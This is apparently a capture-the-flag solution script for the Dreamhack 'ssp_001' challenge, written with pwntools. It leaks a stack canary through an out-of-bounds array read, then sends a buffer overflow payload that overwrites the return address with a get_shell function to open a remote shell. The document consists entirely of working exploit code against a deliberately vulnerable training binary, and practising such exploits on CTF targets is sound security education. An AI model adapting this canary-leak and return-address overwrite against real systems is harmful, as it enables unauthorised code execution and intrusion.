#!/usr/bin/env python3

from pwn import *

exe = ELF("./ssp_001_patched")

context.binary = exe
context.log_level = "debug"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 20727)

    return r


def main():
    r = conn()
    canary = b""
    for i in range(128, 132):
        r.sendlineafter(b"> ", b"P")
        r.sendlineafter(b"Element index : ", str(i).encode())
        value = r.recvline().split(b" ")[-1]
        canary += bytes.fromhex(value.decode())
    canary = u32(canary)
    success(f"Canary: {hex(canary)}")
    r.sendlineafter(b"> ", b"E")
    r.sendlineafter(b"Name Size : ", b"1000")
    payload = b"A" * 0x40 + p32(canary) + b"B" * 0x8 + p32(exe.sym["get_shell"])
    r.sendlineafter(b"Name : ", payload)
    r.interactive()

if __name__ == "__main__":
    main()
